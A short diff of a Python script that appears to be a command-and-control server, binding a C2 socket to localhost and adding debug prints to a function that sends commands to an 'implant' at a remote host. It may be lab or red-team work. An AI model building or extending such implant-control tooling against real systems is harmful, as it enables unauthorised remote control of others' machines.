@@ -22,7 +22,7 @@ if RHOST is None:
 c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Bind the socket to the port
-server_address = (RHOST, 9999)
+server_address = ('localhost', 9999)
 c2_socket.bind(server_address)
 
 colorama.init(autoreset=True)
@@ -63,7 +63,9 @@ def send_implant(comm):
     implant_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     # Connect the socket to the port where the server is listening
     implant_server_address = (RHOST, 10000)
+    print(f'Connecting to {RHOST} on port 10000')
     implant_socket.connect(implant_server_address)
+    print('Connected')
     implant_socket.sendall(str.encode(comm))
     implant_socket.close()
 
@@ -137,6 +139,3 @@ while(True):
     #Any other input
     else:
         print("Unrecognized input")
-
-        
-    
